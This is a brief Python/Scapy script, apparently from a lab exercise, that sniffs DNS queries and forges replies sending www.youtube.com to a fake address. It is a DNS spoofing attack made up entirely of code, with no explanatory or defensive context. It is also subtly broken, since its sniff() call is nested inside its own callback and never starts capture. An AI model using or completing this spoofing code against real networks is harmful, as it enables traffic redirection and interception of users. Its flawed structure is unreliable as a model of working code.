victim_ip = "10.0.2.15" #Kali IP

domain = "www.youtube.com" 

fake_ip = "192.168.0.200"

def dns_spoof(pkt):

  if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:

    if domain in pkt.getlayer(DNS).qd.qname.decode('utf-8'):

      # Craft spoofed response
      spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=fake_ip))

      send(spoofed_pkt)

  sniff(filter="udp port 53", prn=dns_spoof)
